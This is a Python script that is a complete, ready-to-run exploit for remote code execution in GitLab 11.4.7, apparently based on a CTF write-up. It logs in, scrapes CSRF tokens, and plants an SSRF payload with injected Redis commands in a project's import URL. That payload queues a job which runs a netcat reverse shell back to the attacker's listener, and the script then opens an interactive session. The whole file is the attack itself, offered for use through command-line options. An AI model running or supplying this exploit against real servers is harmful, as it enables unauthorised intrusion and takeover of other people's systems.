import datetime
import json
import random
import re
import string
import sys
from argparse import ArgumentParser
from urllib.parse import urljoin

import pwn
import requests
from termcolor import colored


class GitLabExploit():
    """
    GitLab 11.4.7 Remote Code Execution
    Based on https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
    """

    PAYLOAD_TEMPLATE = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push '{}'
 exec
 exec"""

    def __init__(self, url, username, password, listener_ip, listener_port):
        self.url = url
        self.username = username
        self.password = password
        self.listener_ip = listener_ip
        self.listener_port = listener_port

        # Create requests session for storing cookies
        self.r_session = requests.Session()

        # Create reverse shell listener
        self.pwn_listener = pwn.listen(int(listener_port))


    def exploit(self):
        self.login()
        self.create_new_project()


    def get_csrf_token(self, data):
        csrf_token_r = re.search(r'<meta name="csrf-token" content="(?P<csrf>.+?)"', data)
        if not csrf_token_r:
            print(colored("[-] Failed to find CSRF token", "red"))
            sys.exit(1)
        csrf_token = csrf_token_r.group("csrf")
        print(colored("[+] Found CSRF token: " + csrf_token, "green"))
        return csrf_token


    def get_namespace_id(self, data):
        namespace_id_r = re.search(r'value="(?P<namespace_id>.+?)" type="hidden" name="project\[namespace_id\]"', data)
        if not namespace_id_r:
            print(colored("[-] Failed to find namespace ID", "red"))
            sys.exit(1)
        namespace_id = namespace_id_r.group("namespace_id")
        print(colored("[+] Found namespace ID: " + namespace_id, "green"))
        return namespace_id


    def login(self):
        # Get CSRF token
        login_url = urljoin(self.url, "/users/sign_in")
        login_r = self.r_session.get(login_url)

        csrf_token = self.get_csrf_token(login_r.text)

        # Login
        data = {
            "utf8"               : "✓",
            "authenticity_token" : csrf_token,
            "user[login]"        : self.username,
            "user[password]"     : self.password,
            "user[remember_me]"  : "0"
        }
        login_r = self.r_session.post(login_url, data=data)

        if login_r.status_code != requests.codes.ok:
            print(colored("[-] Failed to login", "red"))
            sys.exit(1)

        print(colored("[+] Logged in", "green"))


    def create_new_project(self):
        # Get CSRF token and namespace ID
        projects_new_url = urljoin(self.url, "/projects/new")
        projects_r = self.r_session.get(projects_new_url)

        csrf_token = self.get_csrf_token(projects_r.text)
        namespace_id = self.get_namespace_id(projects_r.text)

        # Create Redis payload
        payload = self.PAYLOAD_TEMPLATE.format(json.dumps({
            "class"       : "GitlabShellWorker",
            "args"        : [
                "class_eval",
                # Command to execute
                "open(\"| nc {} {} -e /bin/bash\").read".format(self.listener_ip, self.listener_port)
            ],
            "retry"       : 3,
            "queue"       : "system_hook_push",
            "jid"         : ''.join(random.choice(string.ascii_lowercase) for _ in range(24)),
            "created_at"  : datetime.datetime.now().timestamp(),
            "enqueued_at" : datetime.datetime.now().timestamp()
        }))

        # Create new project
        project_name = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
        data = {
            "utf8"                      : "✓",
            "authenticity_token"        : csrf_token,
            "project[import_url]"       : payload,
            "project[ci_cd_only]"       : "false",
            "project[name]"             : project_name,
            "project[namespace_id]"     : namespace_id,
            "project[path]"             : project_name,
            "project[description]"      : "",
            "project[visibility_level]" : "0"
        }
        projects_url = urljoin(self.url, "/projects")
        login_r = self.r_session.post(projects_url, data=data)

        if login_r.status_code != requests.codes.ok:
            print(colored("[-] Failed to create new project", "red"))
            sys.exit(1)

        print(colored("[+] New project created", "green"))

        self.pwn_listener.interactive()


if __name__ == "__main__":
    parser = ArgumentParser(description="GitLab 11.4.7 Remote Code Execution Exploit")
    parser.add_argument("-t", "--target", required=True, type=str, action="store", dest="target", help='GitLab URL - http://10.10.10.10:8000/')
    parser.add_argument("-u", "--username", required=True, type=str, action="store", dest="username", help="GitLab username")
    parser.add_argument("-p", "--password", required=True, type=str, action="store", dest="password", help="GitLab password")
    parser.add_argument("-li", "--listener-ip", required=True, type=str, action="store", dest="listener_ip", help="IP for reverse shell")
    parser.add_argument("-lp", "--listener-port", default="4444", type=str, action="store", dest="listener_port", help="Port for reverse shell")
    args = parser.parse_args()

    e = GitLabExploit(args.target, args.username, args.password, args.listener_ip, args.listener_port)
    e.exploit()
